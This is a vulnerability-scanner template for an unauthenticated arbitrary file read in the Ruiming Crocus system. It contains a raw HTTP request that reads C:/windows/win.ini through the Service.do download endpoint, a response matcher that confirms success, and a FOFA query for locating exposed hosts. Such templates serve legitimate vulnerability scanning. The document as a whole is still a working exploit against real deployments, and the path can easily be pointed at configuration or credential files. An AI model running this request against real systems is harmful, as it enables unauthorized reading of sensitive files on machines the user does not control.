http:
    - matchers:
        - part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
id: ruiming-Crocus-DOWNLOAD-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="inp_verification"
        锐明Crocus系统download接口存在任意文件读取漏洞。攻击者无需进行身份验证即可利用该漏洞读取系统中的重要文件，例如数据库配置文件、系统配置文件等。
    name: 锐明Crocus系统 DOWNLOAD 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/PL99O363ZXWMyA10iHQPsA
    severity: high
    tags:
        - File reading
        - Crocus
        - 锐明Crocus系统
